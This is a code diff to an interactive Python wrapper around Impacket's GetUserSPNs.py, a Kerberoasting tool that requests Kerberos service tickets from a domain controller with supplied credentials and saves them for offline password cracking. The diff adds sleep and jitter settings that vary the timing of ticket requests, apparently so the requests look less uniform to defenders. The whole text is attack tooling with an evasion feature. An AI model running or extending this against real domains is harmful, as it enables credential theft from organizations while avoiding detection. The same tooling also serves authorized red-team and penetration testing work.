@@ -12,6 +12,8 @@ scale = 16
 enctype = 23
 kdcbin = bin(int(kdcopt, scale))[2:].zfill(32)
 cmd = ''
+sleep = 0
+jitter = 0
 
 class termcolor:
     WHITE = '\033[37m'
@@ -29,7 +31,7 @@ def signal_handler(sig, frame):
     print('Type exit to exit. Press enter to continue...')
 
 def banner():
-    global kdcopt, kdcbin, cmd, enctype
+    global kdcopt, kdcbin, cmd, enctype, sleep, jitter
     print(termcolor.BLUE + termcolor.BOLD + '        |\\  ' + termcolor.END)
     print(termcolor.BLUE + termcolor.BOLD + '___|\\___|\\\\___██████__██████__██████__██___██_███████_██____██_███████______' + termcolor.END)
     print(termcolor.BLUE + termcolor.BOLD + '___|/__@\'_\\|_██____██_██___██_██___██_██___██_██______██____██_██________|__||' + termcolor.END)
@@ -73,6 +75,8 @@ def banner():
     print('    ' + '{:30s}'.format('(dcip) Domain IP Address') + termcolor.YELLOW + termcolor.BOLD + '[' + dcip + ']' + termcolor.END)
     print('    ' + '{:30s}'.format('(file) Filename') + termcolor.YELLOW + termcolor.BOLD + '[' + file + ']' + termcolor.END)
     print('    ' + '{:30s}'.format('(enc) Encryption') + termcolor.YELLOW + termcolor.BOLD + '[' + str(enctype) + ']' + termcolor.END)
+    print('    ' + '{:30s}'.format('(sleep) Sleep') + termcolor.YELLOW + termcolor.BOLD + '[' + str(sleep) + ']' + termcolor.END)
+    print('    ' + '{:30s}'.format('(jitter) Jitter') + termcolor.YELLOW + termcolor.BOLD + '[' + str(jitter) + ']' + termcolor.END)
     print('')
 
 def pycommand():
@@ -82,7 +86,7 @@ def pycommand():
 
 def updatecmd():
     global cmd
-    cmd = 'python3 ./GetUserSPNs.py \'' + cred + '\' -dc-ip ' + dcip + ' -request -outputfile ' + file + ' -options \"' + kdcopt + '\"' + ' -encryption \"' + str(enctype) + '\"'
+    cmd = 'python3 ./GetUserSPNs.py \'' + cred + '\' -dc-ip ' + dcip + ' -request -outputfile ' + file + ' -options \"' + kdcopt + '\"' + ' -encryption \"' + str(enctype) + '\"' + ' -sleep \"' + str(sleep) + '\"'  + ' -jitter \"' + str(jitter) + '\"'
 
 def commands():
     print('')
@@ -93,6 +97,8 @@ def commands():
     print('    ' + '{:30s}'.format('dcip <value>') + termcolor.WHITE + 'Sets the GetUserSPNs.py domain IP parameter.' + termcolor.END)
     print('    ' + '{:30s}'.format('file <value>') + termcolor.WHITE + 'Sets the GetUserSPNs.py filename parameter.' + termcolor.END)
     print('    ' + '{:30s}'.format('enc') + termcolor.WHITE + 'Toggles the encryption type from 23 (RC4) to 18 (AES-256).' + termcolor.END)
+    print('    ' + '{:30s}'.format('sleep') + termcolor.WHITE + 'Set the time to wait before requesting each TGS.' + termcolor.END)
+    print('    ' + '{:30s}'.format('jitter') + termcolor.WHITE + 'Set the Jitter to avoid waiting a constant sleep time between each TGS request.' + termcolor.END)
     print('    ' + '{:30s}'.format('command') + termcolor.WHITE + 'Show the GetUserSPNs.py command with specified options.' + termcolor.END)
     print('    ' + '{:30s}'.format('run') + termcolor.WHITE + 'Runs GetUserSPNs.py with the selected options.' + termcolor.END)
     print('    ' + '{:30s}'.format('clear') + termcolor.WHITE + 'Clears the screen and displays the options.' + termcolor.END)
@@ -100,7 +106,7 @@ def commands():
     print('')
 
 def main():
-    global kdcopt, kdcbin, scale, cred, dcip, file, cmd, enctype
+    global kdcopt, kdcbin, scale, cred, dcip, file, cmd, enctype, sleep, jitter
     os.system('clear')
     banner()
     updatecmd()
@@ -150,6 +156,22 @@ def main():
                     enctype = 23
                 else:
                     enctype = 18
+                os.system('clear')
+                banner()
+            elif 'sleep' in rsp:
+                try:
+                    sleep = int(rsp[6:])
+                except:
+                    print("Invalid integer value.")
+                    sleep = 0
+                os.system('clear')
+                banner()
+            elif 'jitter' in rsp:
+                try:
+                    jitter = int(rsp[6:])
+                except:
+                    print("Invalid integer value.")
+                    jitter = 0
                 os.system('clear')
                 banner()
             elif rsp == 'help':
